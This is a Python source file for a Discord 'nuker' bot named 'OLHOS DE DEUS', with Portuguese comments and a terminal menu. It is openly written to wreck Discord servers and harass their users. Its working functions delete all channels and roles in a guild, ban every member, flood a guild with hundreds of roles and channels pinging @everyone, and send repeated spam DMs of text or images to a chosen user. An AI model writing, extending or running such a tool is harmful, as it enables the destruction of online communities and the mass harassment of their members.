#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# OLHOS DE DEUS – GUI Edition (Indentação Corrigida)
# By: V4Warden

import os, sys, json, time, random, string, asyncio, discord
from discord.ext import commands
import tkinter as tk
from tkinter import filedialog, messagebox

# ---------- BANNER ----------
BANNER = r"""
        @@@@
      @@    @@@@@  @@@@ @@@@
      @          @@@@ @@    @
      @          @ @@@@@@   @
     @          @@@@@   @@@@@
    @                @@@@@@@@
   @                   @@@@@
 @@@     @                 @
   @    @@                 @
   @@                @@    @
  @@@         @@@    @@   @@
     @@                  @@@
       @@@             @@@
   @@@@@ @@@@@@@@@@@@@@@
   @    @@@@@    @@@@   @
   @    @@@ @@@@@@@@   @@@
   @@@@@@@@@@@@@  @@@@@   @@
  @      @@@@@@@@@@@       @
 @         @@@@@@@@        @
  @        @@@@@@@@        @
  @@       @@    @@      @@
    @@@@@@@        @@@@@@
        F O R   W I N
         By: V4Warden
"""

# ---------- CONFIG ----------
CONFIG_FILE = "olhos_config.json"
if os.path.exists(CONFIG_FILE):
    with open(CONFIG_FILE, "r", encoding="utf-8") as f:
        cfg = json.load(f)
else:
    cfg = {}

def save_cfg():
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2, ensure_ascii=False)

# ---------- INPUT ASSÍNCRONO ----------
async def ainput(prompt=""):
    return await asyncio.to_thread(input, prompt)

# ---------- BOT ----------
intents = discord.Intents.all()
intents.message_content = True

class MyBot(commands.Bot):
    async def setup_hook(self):
        self.loop.create_task(terminal_panel())

bot = MyBot(command_prefix="!", intents=intents, help_command=None)

# ---------- FUNÇÕES ----------
def rnd_str(n=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

# ---------- FUNÇÕES ANTIGAS ----------
async def clone_server(guild_id: int):
    try:
        src = await bot.fetch_guild(guild_id)
    except discord.NotFound:
        print("[-] Servidor inválido ou bot não está nele.")
        await asyncio.sleep(2)
        return
    except discord.Forbidden:
        print("[-] Sem permissão para acessar o servidor.")
        await asyncio.sleep(2)
        return
    new = await bot.create_guild(f"Clone-{src.name}-{rnd_str()}")
    await asyncio.sleep(5)
    print(f"[+] Clone do servidor '{src.name}' criado.")
    await asyncio.sleep(2)

async def spam_dm(user_id: int, texto: str):
    try:
        user = await bot.fetch_user(user_id)
    except:
        print("[-] Usuário inválido.")
        await asyncio.sleep(2)
        return
    for _ in range(50):
        try:
            await user.send(texto)
            await asyncio.sleep(0.3)
        except:
            pass
    print("[+] Spam finalizado.")
    await asyncio.sleep(2)

async def nuke_server(guild_id: int):
    g = bot.get_guild(guild_id)
    if not g:
        print("[-] Bot fora do servidor.")
        await asyncio.sleep(2)
        return
    msg   = cfg.get("nuke_msg", "OLHOS DE DEUS")
    sname = cfg.get("server_name", "RIP")
    cname = cfg.get("channel_name", "ruina")
    for ch in list(g.channels):
        try:
            await ch.delete()
        except:
            pass
    for r in list(g.roles):
        try:
            await r.delete()
        except:
            pass
    try:
        await g.edit(name=sname)
    except:
        pass
    for i in range(50):
        try:
            ch = await g.create_text_channel(f"{cname}-{i}")
            await ch.send(msg)
        except:
            pass
    print("[+] Nuke finalizado.")
    await asyncio.sleep(2)

# ---------- FUNÇÕES NOVAS ----------
async def spam_dm_fotos(user_id: int, legenda: str, pasta: str = "imgs"):
    try:
        user = await bot.fetch_user(user_id)
    except:
        print("[-] Usuário inválido.")
        await asyncio.sleep(2)
        return
    if not os.path.isdir(pasta):
        print(f"[-] Pasta '{pasta}' não encontrada.")
        await asyncio.sleep(2)
        return
    arqs = [os.path.join(pasta, f) for f in os.listdir(pasta)
            if f.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.webp'))]
    if not arqs:
        print("[-] Nenhuma imagem encontrada.")
        await asyncio.sleep(2)
        return
    for img_path in random.choices(arqs, k=min(50, len(arqs))):
        try:
            with open(img_path, 'rb') as img:
                file = discord.File(img, filename=os.path.basename(img_path))
                await user.send(content=legenda, file=file)
            await asyncio.sleep(0.4)
        except:
            pass
    print("[+] Spam de fotos finalizado.")
    await asyncio.sleep(2)

async def limpar_dm(user_id: int):
    try:
        user = await bot.fetch_user(user_id)
        dm = await user.create_dm()
        async for msg in dm.history(limit=100):
            if msg.author == bot.user:
                try:
                    await msg.delete()
                    await asyncio.sleep(0.25)
                except:
                    pass
        print("[+] Limpeza de DM concluída.")
    except:
        print("[-] Falha ao limpar DM.")
    await asyncio.sleep(2)

async def flood_server(guild_id: int, texto: str, qtd: int = 200):
    g = bot.get_guild(guild_id)
    if not g:
        print("[-] Bot fora do servidor.")
        await asyncio.sleep(2)
        return
    for i in range(qtd):
        try:
            role = await g.create_role(name=f"{texto}-{i}")
            ch   = await g.create_text_channel(f"{texto}-{i}")
            await ch.send(f"@everyone {texto}")
        except:
            pass
    print("[+] Flood finalizado.")
    await asyncio.sleep(2)

async def ban_all(guild_id: int):
    g = bot.get_guild(guild_id)
    if not g:
        print("[-] Bot fora do servidor.")
        await asyncio.sleep(2)
        return
    for m in list(g.members):
        try:
            await m.ban(reason="OLHOS DE DEUS")
        except:
            pass
    print("[+] Banimento em massa finalizado.")
    await asyncio.sleep(2)

async def mudar_icon(guild_id: int, caminho: str):
    g = bot.get_guild(guild_id)
    if not g:
        print("[-] Bot fora do servidor.")
        await asyncio.sleep(2)
        return
    if not os.path.isfile(caminho):
        print("[-] Arquivo de ícone não encontrado.")
        await asyncio.sleep(2)
        return
    with open(caminho, 'rb') as img:
        try:
            await g.edit(icon=img.read())
            print("[+] Ícone alterado.")
        except:
            print("[-] Sem permissão para alterar ícone.")
    await asyncio.sleep(2)

async def criar_convite_inf(guild_id: int, canal_id: int = None):
    g = bot.get_guild(guild_id)
    if not g:
        print("[-] Bot fora do servidor.")
        await asyncio.sleep(2)
        return
    ch = bot.get_channel(canal_id) if canal_id else g.text_channels[0]
    try:
        invite = await ch.create_invite(max_age=0, max_uses=0, unique=False)
        print(f"[+] Convite: {invite.url}")
    except:
        print("[-] Não foi possível criar convite.")
    await asyncio.sleep(2)

# ---------- GUI HELPER ----------
def gui_file(title="Selecione o arquivo", filetypes=[("Imagens", "*.png *.jpg *.jpeg *.gif *.webp")]):
    root = tk.Tk()
    root.withdraw()
    path = filedialog.askopenfilename(title=title, filetypes=filetypes)
    root.destroy()
    return path

def gui_folder(title="Selecione a pasta"):
    root = tk.Tk()
    root.withdraw()
    path = filedialog.askdirectory(title=title)
    root.destroy()
    return path
                                                                     #4W

# ---------- PAINEL ----------
async def terminal_panel():
    await bot.wait_until_ready()
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print(BANNER)
        print("1 – Clonar servidor")
        print("2 – Spam DM texto")
        print("3 – Nukar servidor")
        print("4 – Configurar mensagem do nuke")
        print("5 – Configurar nome do servidor pós-nuke")
        print("6 – Configurar nome base dos canais")
        print("7 – Ver configurações")
        print("8 – Spam DM com fotos (GUI)")
        print("9 – Limpar minhas mensagens na DM")
        print("10 – Flood cargo + canal (200x)")
        print("11 – Banir todos os membros")
        print("12 – Mudar ícone do servidor (GUI)")
        print("13 – Criar convite permanente")
        print("0 – Sair")

        opt = (await ainput("> ")).strip()

        if opt == "1":
            gid = int(await ainput("ID do servidor: "))
            await clone_server(gid)
        elif opt == "2":
            uid = int(await ainput("ID do usuário: "))
            txt = await ainput("Mensagem: ")
            await spam_dm(uid, txt)
        elif opt == "3":
            gid = int(await ainput("ID do servidor: "))
            await nuke_server(gid)
        elif opt == "4":
            cfg["nuke_msg"] = await ainput("Mensagem: ")
            save_cfg()
        elif opt == "5":
            cfg["server_name"] = await ainput("Nome: ")
            save_cfg()
        elif opt == "6":
            cfg["channel_name"] = await ainput("Nome base: ")
            save_cfg()
        elif opt == "7":
            print(json.dumps(cfg, indent=2, ensure_ascii=False))
            await ainput("\nEnter para continuar...")
        elif opt == "8":
            uid  = int(await ainput("ID do usuário: "))
            leg  = await ainput("Legenda da foto: ")
            pasta = gui_folder("Selecione a pasta com imagens")
            if pasta:
                await spam_dm_fotos(uid, leg, pasta)
            else:
                print("[-] Nenhuma pasta selecionada.")
                await asyncio.sleep(2)
        elif opt == "9":
            uid = int(await ainput("ID do usuário: "))
            await limpar_dm(uid)
        elif opt == "10":
            gid = int(await ainput("ID do servidor: "))
            txt = await ainput("Texto para flood: ")
            await flood_server(gid, txt)
        elif opt == "11":
            gid = int(await ainput("ID do servidor: "))
            await ban_all(gid)
        elif opt == "12":
            gid  = int(await ainput("ID do servidor: "))
            path = gui_file("Selecione a imagem 128x128")
            if path:
                await mudar_icon(gid, path)
            else:
                print("[-] Nenhuma imagem selecionada.")
                await asyncio.sleep(2)
        elif opt == "13":
            gid  = int(await ainput("ID do servidor: "))
            cid  = await ainput("ID do canal (deixe vazio para primeiro): ")
            cid  = int(cid) if cid.strip() else None
            await criar_convite_inf(gid, cid)
        elif opt == "0":
            os._exit(0)
        else:
            print("Opção inválida.")
            await asyncio.sleep(1)

# ---------- START ----------
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(BANNER)
        print("Uso: python bot.py <TOKEN>")
        sys.exit(1)
    bot.run(sys.argv[1])

